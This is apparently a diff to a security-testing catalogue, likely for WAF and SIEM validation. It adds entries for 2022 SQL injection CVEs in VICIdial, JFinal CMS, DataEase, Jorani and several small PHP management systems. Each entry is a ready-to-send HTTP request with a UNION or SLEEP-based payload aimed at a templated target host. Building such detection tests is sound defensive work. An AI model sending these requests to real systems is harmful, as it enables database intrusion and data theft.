@@ -356995,6 +356995,456 @@
     "visible": true
   },
   {
+    "name": "CVE-2022-34928 - JFinal CMS SQL Injection",
+    "displayName": "CVE-2022-34928 - JFinal CMS SQL Injection",
+    "description": "JFinal CMS v5.1.0 has a SQL injection in the admin list controllers via the unfiltered orderBy parameter (ORDER BY clause string concatenation in list()); the /system/user path maps to UserController.list(). The request injects a SELECT SLEEP() sub-query in orderBy. HTTP method GET inferred (list page); orderBy parameter taken from the project issue documenting the same sink across sibling controllers. No vendor WAF rule found; built from the issue advisory.\n\nReferences used to recreate this request:\n- https://github.com/jflyfox/jfinal_cms/issues/43 (PoC issue)\n- https://github.com/jflyfox/jfinal_cms/issues/62 (orderBy SQLi sink across list controllers)\n- https://www.cve.org/CVERecord?id=CVE-2022-34928 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /system/user?orderBy=id%2C(SELECT%20SLEEP(5)) HTTP/1.1\nHost: {{target_host}}\nCookie: JSESSIONID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-34928"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-34928",
+        "link": "https://github.com/jflyfox/jfinal_cms/issues/43"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-34878 - VICIdial SQL Injection",
+    "displayName": "CVE-2022-34878 - VICIdial SQL Injection",
+    "description": "VICIdial (prior to 3555) is vulnerable to SQL injection in the User Stats interface (/vicidial/user_stats.php) via the file_download parameter. The request sends a UNION-based SQLi payload in file_download. Authentication is HTTP Basic (dummy credentials included so the request shape matches). HTTP method GET inferred from the Metasploit module. No vendor WAF rule found; built from the Metasploit PoC.\n\nReferences used to recreate this request:\n- https://github.com/rapid7/metasploit-framework/pull/16732 (Metasploit PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-34878 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /vicidial/user_stats.php?file_download=%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20- HTTP/1.1\nHost: {{target_host}}\nAuthorization: Basic ZHVtbXk6ZHVtbXk=\nCookie: VICIDIALNOW=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-34878"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-34878",
+        "link": "https://github.com/rapid7/metasploit-framework/pull/16732"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-34877 - VICIdial SQL Injection",
+    "displayName": "CVE-2022-34877 - VICIdial SQL Injection",
+    "description": "VICIdial 2.14b0.5 before 3555 is vulnerable to SQL injection in the AST Agent Time Sheet interface (/vicidial/AST_agent_time_sheet.php) via the agent parameter. The request sends a UNION-based SQLi payload in agent. HTTP Basic auth (dummy). HTTP method GET inferred from the Metasploit module. No vendor WAF rule found; built from the Metasploit PoC.\n\nReferences used to recreate this request:\n- https://github.com/rapid7/metasploit-framework/pull/16732 (Metasploit PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-34877 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /vicidial/AST_agent_time_sheet.php?agent=%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20- HTTP/1.1\nHost: {{target_host}}\nAuthorization: Basic ZHVtbXk6ZHVtbXk=\nCookie: VICIDIALNOW=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-34877"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-34877",
+        "link": "https://github.com/rapid7/metasploit-framework/pull/16732"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-34876 - VICIdial SQL Injection",
+    "displayName": "CVE-2022-34876 - VICIdial SQL Injection",
+    "description": "VICIdial 2.14b0.5 before 3555 is vulnerable to SQL injection in the admin interface (/vicidial/admin.php) via the modify_email_accounts (also access_recordings, agentcall_email) parameter. The request sends a UNION-based SQLi payload in modify_email_accounts. HTTP Basic auth (dummy). HTTP method GET inferred from the Metasploit module. No vendor WAF rule found; built from the Metasploit PoC.\n\nReferences used to recreate this request:\n- https://github.com/rapid7/metasploit-framework/pull/16732 (Metasploit PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-34876 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /vicidial/admin.php?modify_email_accounts=%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20- HTTP/1.1\nHost: {{target_host}}\nAuthorization: Basic ZHVtbXk6ZHVtbXk=\nCookie: VICIDIALNOW=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-34876"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-34876",
+        "link": "https://github.com/rapid7/metasploit-framework/pull/16732"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-34590 - itsourcecode Hospital Management System SQL Injection",
+    "displayName": "CVE-2022-34590 - itsourcecode Hospital Management System SQL Injection",
+    "description": "itsourcecode Hospital Management System v1.0 is vulnerable to SQL injection via the editid parameter at /HMS/admin.php. The request sends a UNION-based SQLi payload in editid. HTTP method GET inferred (edit-by-id action). No vendor WAF rule found; built from the PoC report.\n\nReferences used to recreate this request:\n- https://github.com/Renrao/bug_report/blob/master/blob/main/vendors/itsourcecode.com/hospital-management-system/sql_injection.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-34590 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /HMS/admin.php?editid=%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-34590"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-34590",
+        "link": "https://github.com/Renrao/bug_report/blob/master/blob/main/vendors/itsourcecode.com/hospital-management-system/sql_injection.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-34588 - itsourcecode Advanced School Management System SQL Injection",
+    "displayName": "CVE-2022-34588 - itsourcecode Advanced School Management System SQL Injection",
+    "description": "itsourcecode Advanced School Management System v1.0 is vulnerable to SQL injection via the grade parameter at /school/view/timetable_insert_form.php. The request sends a UNION-based SQLi payload in grade. HTTP method GET inferred. No vendor WAF rule found; built from the PoC report.\n\nReferences used to recreate this request:\n- https://github.com/Renrao/bug_report/blob/master/blob/main/vendors/itsourcecode.com/advanced-school-management-system/sql_injection3.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-34588 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /school/view/timetable_insert_form.php?grade=%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-34588"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-34588",
+        "link": "https://github.com/Renrao/bug_report/blob/master/blob/main/vendors/itsourcecode.com/advanced-school-management-system/sql_injection3.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-34586 - itsourcecode Advanced School Management System SQL Injection",
+    "displayName": "CVE-2022-34586 - itsourcecode Advanced School Management System SQL Injection",
+    "description": "itsourcecode Advanced School Management System v1.0 is vulnerable to SQL injection via the grade parameter at /school/view/student_grade_wise.php. The request sends a UNION-based SQLi payload in grade. HTTP method GET inferred. No vendor WAF rule found; built from the PoC report.\n\nReferences used to recreate this request:\n- https://github.com/Renrao/bug_report/blob/master/blob/main/vendors/itsourcecode.com/advanced-school-management-system/sql_injection.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-34586 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /school/view/student_grade_wise.php?grade=%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-34586"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-34586",
+        "link": "https://github.com/Renrao/bug_report/blob/master/blob/main/vendors/itsourcecode.com/advanced-school-management-system/sql_injection.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-34557 - itsourcecode Barangay Management System SQL Injection",
+    "displayName": "CVE-2022-34557 - itsourcecode Barangay Management System SQL Injection",
+    "description": "Barangay Management System v1.0 is vulnerable to SQL injection via the hidden_id parameter at /pages/permit/permit.php. The request sends a UNION-based SQLi payload in hidden_id. HTTP method POST inferred (hidden_id is a hidden form field). No vendor WAF rule found; built from the PoC report.\n\nReferences used to recreate this request:\n- https://github.com/AD-Appledog/bug_report/blob/main/vendors/itsourcecode.com/barangay-management-system/SQLi-1.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-34557 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /pages/permit/permit.php HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\nContent-Type: application/x-www-form-urlencoded\n\nhidden_id=%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-\n"
+    },
+    "cves": [
+      "CVE-2022-34557"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-34557",
+        "link": "https://github.com/AD-Appledog/bug_report/blob/main/vendors/itsourcecode.com/barangay-management-system/SQLi-1.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-34114 - DataEase SQL Injection",
+    "displayName": "CVE-2022-34114 - DataEase SQL Injection",
+    "description": "DataEase v1.11.1 exposes the /dataset/table/sqlPreview endpoint to low-privileged users, which executes attacker-supplied SQL. The request supplies a dataSourceId and an info object whose sql field contains a UNION SELECT payload. HTTP method and JSON body taken directly from the vendor issue PoC. No vendor WAF rule found; built from the vendor issue PoC.\n\nReferences used to recreate this request:\n- https://github.com/dataease/dataease/issues/2430 (vendor issue PoC with full HTTP request)\n- https://www.cve.org/CVERecord?id=CVE-2022-34114 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /dataset/table/sqlPreview HTTP/1.1\nHost: {{target_host}}\nAuthorization: dummy\nAccept: application/json\nContent-Type: application/json\n\n{\"dataSourceId\": \"1\", \"info\": \"{\\\"sql\\\":\\\"select 1 UNION SELECT version()\\\"}\"}\n"
+    },
+    "cves": [
+      "CVE-2022-34114"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-34114",
+        "link": "https://github.com/dataease/dataease/issues/2430"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-34132 - Jorani SQL Injection",
+    "displayName": "CVE-2022-34132 - Jorani SQL Injection",
+    "description": "Jorani v1.0 is vulnerable to SQL injection via the id parameter handled in application/controllers/Leaves.php. The request sends a time-based SQLi payload (AND SLEEP(5)) in id. Jorani is a CodeIgniter app, so the Leaves controller is reached at /leaves/<method>; the route /leaves/leaves and GET method are inferred from CodeIgniter conventions (exact method segment not public), while the Leaves.php file and id argument are from the CVE/fix. No vendor WAF rule found; built from the issue and fix commit.\n\nReferences used to recreate this request:\n- https://github.com/bbalet/jorani/issues/369 (PoC issue)\n- https://github.com/bbalet/jorani/commit/c5c42e29e6a9e59a3c82450bef48b67b8dd48333 (fix commit)\n- https://www.cve.org/CVERecord?id=CVE-2022-34132 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /leaves/leaves?id=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: ci_session=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-34132"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-34132",
+        "link": "https://github.com/bbalet/jorani/issues/369"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
     "name": "CVE-2022-34042 - itsourcecode Barangay Management System SQL Injection",
     "displayName": "CVE-2022-34042 - itsourcecode Barangay Management System SQL Injection",
     "description": "itsourcecode Barangay Management System v1.0 is vulnerable to SQL injection via the hidden_id parameter at /pages/household/household.php. The request sends a time-based blind SQLi payload (AND SLEEP(5)) in hidden_id, matching OWASP CRS 942. No vendor WAF rule found; built from the VulDB/NVD entry-point description and PoC. HTTP method POST is INFERRED (hidden_id is a hidden form field used for a record action).\n\nReferences used to recreate this request:\n- https://github.com/tianqi5432/bug_report/blob/main/vendors/itsourcecode.com/barangay-management-system/SQLi-1.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-34042 (CVE record)",
@@ -366262,6 +366712,402 @@
     "visible": true
   },
   {
+    "name": "CVE-2022-30886 - School Dormitory Management System SQL Injection",
+    "displayName": "CVE-2022-30886 - School Dormitory Management System SQL Injection",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /dms/admin/reports/daily_collection_report.php?month=1%27%20UNION%20SELECT%201%2C2%2C3--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-30886"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-30886",
+        "link": "https://packetstormsecurity.com/files/167001/School-Dormitory-Management-System-1.0-SQL-Injection.html"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-30843 - Room-rent-portal-site SQL Injection",
+    "displayName": "CVE-2022-30843 - Room-rent-portal-site SQL Injection",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /rrps/classes/Master.php?f=delete_category&id=1%27%20UNION%20SELECT%201%2C2%2C3--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-30843"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-30843",
+        "link": "https://github.com/mikeccltt/bug_report_CVE/blob/main/room-rent-portal-site/sql.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-30835 - Wedding Management System SQL Injection",
+    "displayName": "CVE-2022-30835 - Wedding Management System SQL Injection",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /Wedding-Management/admin/budget.php?booking_id=1%27%20UNION%20SELECT%201%2C2%2C3--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-30835"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-30835",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/codeastro.com/wedding-management-system/SQLi-12.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-30834 - Wedding Management System SQL Injection",
+    "displayName": "CVE-2022-30834 - Wedding Management System SQL Injection",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /Wedding-Management/admin/client_manage_account_details.php?booking_id=31&user_id=1%27%20UNION%20SELECT%201%2C2%2C3--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-30834"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-30834",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/codeastro.com/wedding-management-system/SQLi-11.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-30833 - Wedding Management System SQL Injection",
+    "displayName": "CVE-2022-30833 - Wedding Management System SQL Injection",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /Wedding-Management/admin/client_edit.php?booking=31&user_id=1%27%20UNION%20SELECT%201%2C2%2C3--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-30833"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-30833",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/codeastro.com/wedding-management-system/SQLi-10.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-30832 - Wedding Management System SQL Injection",
+    "displayName": "CVE-2022-30832 - Wedding Management System SQL Injection",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /Wedding-Management/admin/client_assign.php?booking=31&user_id=1%27%20UNION%20SELECT%201%2C2%2C3--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-30832"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-30832",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/codeastro.com/wedding-management-system/SQLi-9.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-30831 - Wedding Management System SQL Injection",
+    "displayName": "CVE-2022-30831 - Wedding Management System SQL Injection",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /Wedding-Management/wedding_details.php?id=1%27%20UNION%20SELECT%201%2C2%2C3--%20- HTTP/1.1\nHost: {{target_host}}\n\n"
+    },
+    "cves": [
+      "CVE-2022-30831"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-30831",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/codeastro.com/wedding-management-system/SQLi-8.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-30830 - Wedding Management System SQL Injection",
+    "displayName": "CVE-2022-30830 - Wedding Management System SQL Injection",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /Wedding-Management/admin/feature_edit.php?id=1%27%20UNION%20SELECT%201%2C2%2C3--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-30830"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-30830",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/codeastro.com/wedding-management-system/SQLi-5.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-30829 - Wedding Management System SQL Injection",
+    "displayName": "CVE-2022-30829 - Wedding Management System SQL Injection",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /Wedding-Management/admin/users_edit.php?id=1%27%20UNION%20SELECT%201%2C2%2C3--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-30829"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-30829",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/codeastro.com/wedding-management-system/SQLi-7.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
     "name": "CVE-2022-30455 - SourceCodester Badminton Center Management System SQL Injection",
     "displayName": "CVE-2022-30455 - SourceCodester Badminton Center Management System SQL Injection",
     "description": "SourceCodester Badminton Center Management System 1.0 is vulnerable to SQL injection in the id POST parameter of classes/Master.php when f=delete_court_rental. The request sends a UNION SELECT payload in id. Method POST and id body parameter follow the oretnom23 Master.php AJAX delete pattern (sqlmap --data \"id=*\"); no vendor WAF rule found, built from the advisory/PoC.\n\nReferences used to recreate this request:\n- https://github.com/mikeccltt/badminton-center-management-system/blob/main/badminton-center-management-system.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-30455 (CVE record)",
@@ -367841,6 +368687,1089 @@
     "visible": true
   },
   {
+    "name": "CVE-2022-30000 - itsourcecode Insurance Management System SQL Injection",
+    "displayName": "CVE-2022-30000 - itsourcecode Insurance Management System SQL Injection",
+    "description": "itsourcecode Insurance Management System 1.0 is vulnerable to SQL injection in the recipt_no parameter of /insurance/editPayment.php. The request sends a time-based payload (1' AND SLEEP(5)-- -) in recipt_no. Method is GET (a record-view/edit id parameter). No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/k0xx11/bug_report/blob/main/vendors/itsourcecode.com/insurance-management-system/SQLi-4.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-30000 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /insurance/editPayment.php?recipt_no=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-30000"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-30000",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/itsourcecode.com/insurance-management-system/SQLi-4.md"
+      },
+      {
+        "title": "CVE record for CVE-2022-30000",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2022-30000"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29999 - itsourcecode Insurance Management System SQL Injection",
+    "displayName": "CVE-2022-29999 - itsourcecode Insurance Management System SQL Injection",
